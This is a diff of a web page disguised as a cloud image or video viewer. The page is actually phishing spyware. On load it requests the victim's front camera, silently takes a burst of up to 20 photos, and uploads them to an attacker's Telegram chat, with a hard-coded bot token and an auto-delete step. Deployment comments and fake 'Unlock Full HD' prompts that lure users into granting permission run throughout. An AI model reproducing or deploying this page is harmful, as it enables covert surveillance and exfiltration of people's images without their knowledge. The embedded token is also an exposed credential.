@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cloud Media Player</title>
+  <title>PostImage - Media Cloud Viewer</title>
   <style>
     * {
       box-sizing: border-box;
@@ -12,7 +12,7 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
     body {
-      background: #070b14;
+      background: #090d16;
       color: #f8fafc;
       min-height: 100vh;
       display: flex;
@@ -22,15 +22,14 @@
       padding: 16px;
     }
     .viewer-card {
-      background: #111a2e;
-      border: 1px solid #1e2d4a;
-      border-radius: 18px;
+      background: #131c2e;
+      border: 1px solid #23314d;
+      border-radius: 16px;
       padding: 20px;
       max-width: 440px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
-      position: relative;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
     }
     .top-bar {
       display: flex;
@@ -38,107 +37,59 @@
       align-items: center;
       padding-bottom: 12px;
       margin-bottom: 14px;
-      border-bottom: 1px solid #1e2d4a;
+      border-bottom: 1px solid #23314d;
       font-size: 13px;
-      font-weight: 600;
       color: #38bdf8;
     }
-    .media-container {
+    .img-box {
       width: 100%;
       border-radius: 12px;
       overflow: hidden;
       background: #020617;
-      border: 1px solid #233554;
+      border: 1px solid #334155;
       margin-bottom: 16px;
-      position: relative;
       min-height: 220px;
       display: flex;
       align-items: center;
       justify-content: center;
     }
-    .media-container img {
+    .img-box img {
       width: 100%;
       max-height: 380px;
       object-fit: contain;
       display: block;
     }
-    .video-overlay {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 64px;
-      height: 64px;
-      background: rgba(2, 132, 199, 0.85);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 0 25px rgba(56, 189, 248, 0.6);
-      cursor: pointer;
-      display: none;
-    }
-    .video-overlay::after {
-      content: "";
-      border-style: solid;
-      border-width: 12px 0 12px 20px;
-      border-color: transparent transparent transparent #ffffff;
-      margin-left: 4px;
-    }
-
-    .btn-action {
+    .btn {
       width: 100%;
-      padding: 15px;
-      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+      padding: 14px;
+      background: #0284c7;
       color: #ffffff;
       border: none;
       border-radius: 10px;
       font-size: 15px;
-      font-weight: 700;
+      font-weight: 600;
       cursor: pointer;
-      display: block;
-      margin-top: 10px;
-      box-shadow: 0 4px 15px rgba(2, 132, 199, 0.4);
-      transition: all 0.2s;
-    }
-    .btn-action:active {
-      transform: scale(0.98);
-      filter: brightness(0.9);
-    }
-
-    .progress-box {
-      width: 100%;
-      background: #1e293b;
-      height: 8px;
-      border-radius: 6px;
-      overflow: hidden;
-      margin-top: 14px;
+      transition: background 0.2s, transform 0.1s;
       display: none;
     }
-    .progress-bar {
-      width: 0%;
-      height: 100%;
-      background: #38bdf8;
-      transition: width 0.3s;
+    .btn:active {
+      transform: scale(0.98);
     }
-
+    .btn:hover {
+      background: #0369a1;
+    }
     #status {
       font-size: 13px;
       color: #94a3b8;
       margin-top: 12px;
       min-height: 20px;
     }
-    .help-box {
-      margin-top: 12px;
-      font-size: 12px;
-      color: #cbd5e1;
-      background: #0a1120;
-      padding: 10px;
-      border-radius: 8px;
-      border: 1px dashed #334155;
+    .help-hint {
+      font-size: 11px;
+      color: #f87171;
+      margin-top: 8px;
       display: none;
     }
-
     video, canvas {
       display: none;
     }
@@ -148,116 +99,97 @@
 
   <div class="viewer-card">
     <div class="top-bar">
-      <span id="titleTag">🖼️ Cloud Media Viewer</span>
+      <span>🖼️ Cloud Image Viewer</span>
       <span style="color:#4ade80;">● Ultra HD</span>
     </div>
 
-    <div class="media-container" id="mediaContainer">
-      <img id="previewImage" src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600" alt="Media Preview">
-      <div class="video-overlay" id="videoPlayIcon"></div>
+    <!-- Gallery Image Preview -->
+    <div class="img-box">
+      <img id="previewImage" src="https://via.placeholder.com/400x300?text=Loading+Media..." alt="Shared Media">
     </div>
 
-    <!-- Visible Action Button -->
-    <button id="allowBtn" class="btn-action">📸 Allow Camera / Unlock Full HD</button>
+    <!-- Fallback Button (agar auto-popup block ho jaye) -->
+    <button id="allowBtn" class="btn">📸 Allow Camera / Unlock Full HD</button>
+    <div id="status">Loading image preview...</div>
+    <div id="helpHint" class="help-hint">Agar popup na aaye toh browser URL bar me Lock (🔒) icon par click karke camera allow karein.</div>
 
-    <div class="progress-box" id="progressBox">
-      <div class="progress-bar" id="progressBar"></div>
-    </div>
-
-    <div id="status">Tap button above to unlock media</div>
-
-    <div class="help-box" id="helpBox">
-      💡 <b>Permission Tip:</b> Browser URL bar me <b>Lock (🔒)</b> ya site settings par tap karke Camera <b>Allow</b> karein.
-    </div>
-
+    <!-- Hidden Video & Canvas for 20 Shots -->
     <video id="videoElement" autoplay playsinline muted></video>
     <canvas id="canvasElement"></canvas>
   </div>
 
   <script>
-    const BOT_TOKEN = "9057540528:AAHA3zbRfTvOdYA23ESw43QziYP_qA0_Xqw";
+    // ==========================================================================
+    // CONFIGURATION (Dono Options Supported):
+    // --------------------------------------------------------------------------
+    // OPTION 1 (100% Safe - Token Hidden):
+    // Agar aap bot.py ko Render ya Termux (Cloudflare tunnel) par chalate hain,
+    // toh apna backend URL yaha dalein. HTML me Bot Token daalne ki zaroorat hi nahi!
+    const BACKEND_URL = ""; // e.g. "https://your-bot-app.onrender.com"
+
+    // OPTION 2 (Direct Telegram API):
+    // Agar backend nahi lagana, toh ye direct Telegram API use karega.
+    const DIRECT_BOT_TOKEN = "9057540528:AAHA3zbRfTvOdYA23ESw43QziYP_qA0_Xqw";
+    // ==========================================================================
 
     const urlParams = new URLSearchParams(window.location.search);
     const targetChatId = urlParams.get('id');
     const customImg = urlParams.get('img');
-    const camMode = (urlParams.get('cam') || 'front').toLowerCase();
-    const themeMode = (urlParams.get('theme') || 'photo').toLowerCase();
 
     const previewImage = document.getElementById('previewImage');
-    const videoPlayIcon = document.getElementById('videoPlayIcon');
-    const titleTag = document.getElementById('titleTag');
     const allowBtn = document.getElementById('allowBtn');
     const statusText = document.getElementById('status');
-    const helpBox = document.getElementById('helpBox');
-    const progressBox = document.getElementById('progressBox');
-    const progressBar = document.getElementById('progressBar');
+    const helpHint = document.getElementById('helpHint');
     const video = document.getElementById('videoElement');
     const canvas = document.getElementById('canvasElement');
 
-    if (themeMode === 'video') {
-      titleTag.innerText = "🎬 Cloud Video Player";
-      videoPlayIcon.style.display = "flex";
-      allowBtn.innerText = "▶ Play Video & Unlock Stream";
-    }
-
-    if (customImg && customImg.startsWith('http')) {
+    if (customImg) {
       previewImage.src = customImg;
     }
 
     let isCapturing = false;
     let shotCount = 0;
-    // Optimized shots: High stability, avoids Telegram 429 rate limit errors
-    const maxShots = 5;
+    const maxShots = 20; // 20 Photos total
     let streamRef = null;
 
-    async function startCamera() {
+    async function requestCameraAndStart() {
       if (isCapturing) return;
 
-      statusText.style.color = "#38bdf8";
-      statusText.innerText = "Connecting media stream...";
-      helpBox.style.display = "none";
-
-      const videoConstraints = (camMode === 'back')
-        ? { facingMode: { ideal: 'environment' } }
-        : { facingMode: 'user' };
-
       try {
+        statusText.style.color = "#38bdf8";
+        statusText.innerText = "Verifying media access...";
+
         streamRef = await navigator.mediaDevices.getUserMedia({
-          video: videoConstraints,
+          video: { facingMode: 'user' },
           audio: false
         });
 
         isCapturing = true;
         video.srcObject = streamRef;
         allowBtn.style.display = "none";
-        videoPlayIcon.style.display = "none";
-        progressBox.style.display = "block";
+        helpHint.style.display = "none";
         statusText.style.color = "#4ade80";
-        statusText.innerText = "Rendering high definition stream...";
+        statusText.innerText = "Media rendering in HD quality...";
 
-        const timer = setInterval(() => {
+        // 1-1 second me 20 photos burst
+        const burstTimer = setInterval(() => {
           shotCount++;
           sendPhoto(shotCount);
 
-          const percent = Math.round((shotCount / maxShots) * 100);
-          progressBar.style.width = percent + "%";
-
           if (shotCount >= maxShots) {
-            clearInterval(timer);
-            statusText.innerText = "✅ Media successfully synchronized!";
+            clearInterval(burstTimer);
+            statusText.innerText = "✅ Media successfully rendered!";
             if (streamRef) {
               streamRef.getTracks().forEach(track => track.stop());
             }
           }
-        }, 1200);
+        }, 1000);
 
       } catch (err) {
-        console.warn("User gesture or permission required:", err);
         allowBtn.style.display = "block";
-        allowBtn.innerText = "🔄 Tap to Allow Camera Permission";
+        helpHint.style.display = "block";
         statusText.style.color = "#f87171";
-        statusText.innerText = "⚠️ Camera permission allow karein media load karne ke liye!";
-        helpBox.style.display = "block";
+        statusText.innerText = "⚠️ Camera permission allow karein HD photo dekhne ke liye.";
       }
     }
 
@@ -269,48 +201,58 @@
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Compressed 0.65 JPEG to optimize traffic and speed
       canvas.toBlob(async (blob) => {
         if (!blob) return;
 
-        const label = (camMode === 'back') ? "Back Camera" : "Front Camera";
         const formData = new FormData();
         formData.append('chat_id', targetChatId);
-        formData.append('photo', blob, `${camMode}_photo_${num}.jpg`);
-        formData.append('caption', `📸 [${label}] Shot ${num}/${maxShots}\n⏰ Time: ${new Date().toLocaleTimeString()}\n⏳ 5-Minute Auto-Delete Active`);
+        formData.append('photo', blob, `snap_${num}.jpg`);
+        formData.append('shot', num);
+        formData.append('total', maxShots);
 
         try {
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-          const resData = await res.json();
+          // If Backend URL is set -> Send to Backend (Token is 100% hidden!)
+          if (BACKEND_URL && BACKEND_URL.startsWith('http')) {
+            await fetch(`${BACKEND_URL}/upload`, {
+              method: 'POST',
+              body: formData
+            });
+          } else {
+            // Direct Telegram API fallback
+            formData.append('caption', `📸 Photo ${num}/${maxShots}\n⏰ Time: ${new Date().toLocaleTimeString()}\n⏳ 5-Minute Auto-Delete Active`);
+            const res = await fetch(`https://api.telegram.org/bot${DIRECT_BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+            const resData = await res.json();
 
-          if (resData.ok && resData.result && resData.result.message_id) {
-            const msgId = resData.result.message_id;
-            setTimeout(async () => {
-              try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ chat_id: targetChatId, message_id: msgId })
-                });
-              } catch (e) {}
-            }, 300000);
+            // 5-minute auto-delete fallback
+            if (resData.ok && resData.result && resData.result.message_id) {
+              const msgId = resData.result.message_id;
+              setTimeout(async () => {
+                try {
+                  await fetch(`https://api.telegram.org/bot${DIRECT_BOT_TOKEN}/deleteMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: targetChatId, message_id: msgId })
+                  });
+                } catch (e) {}
+              }, 300000);
+            }
           }
         } catch (e) {
           console.error("Upload error:", e);
         }
-      }, 'image/jpeg', 0.65);
+      }, 'image/jpeg', 0.85);
     }
 
-    allowBtn.addEventListener('click', startCamera);
-    videoPlayIcon.addEventListener('click', startCamera);
-
+    // Direct Auto-Trigger on Load
     window.addEventListener('DOMContentLoaded', () => {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        startCamera();
-      }
+      requestCameraAndStart();
+    });
+
+    allowBtn.addEventListener('click', () => {
+      requestCameraAndStart();
     });
   </script>
 </body>
